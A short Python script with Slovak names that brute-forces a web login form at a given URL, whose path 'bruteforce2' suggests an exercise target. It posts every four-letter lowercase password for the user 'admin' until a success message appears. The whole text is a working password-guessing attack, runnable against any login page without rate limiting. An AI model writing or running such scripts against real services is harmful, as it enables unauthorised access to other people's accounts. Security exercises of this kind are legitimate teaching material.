import requests
import itertools

url = 'https://dudo.gvpt.sk/bruteforce2/index.php'

odpoved = requests.get(url)

abeceda = 'abcdefghijklmnopqrstuvwxyz'
dlzka_slova = 4
hesla = [''.join(p) for p in itertools.product(abeceda, repeat=dlzka_slova)]

najdene_heslo = None
username = "admin"

for heslo in hesla:
    print(heslo)
    data = {'username': username, 'password': heslo}
    odpoved = requests.post(url, data=data)

    if "Úspešne si sa prihlásil" in odpoved.text:  # replace with the actual success message
        najdene_heslo = heslo
        break

if najdene_heslo:
    print('Nájdené heslo:', najdene_heslo)
else:
    print('Heslo sa nenašlo.')
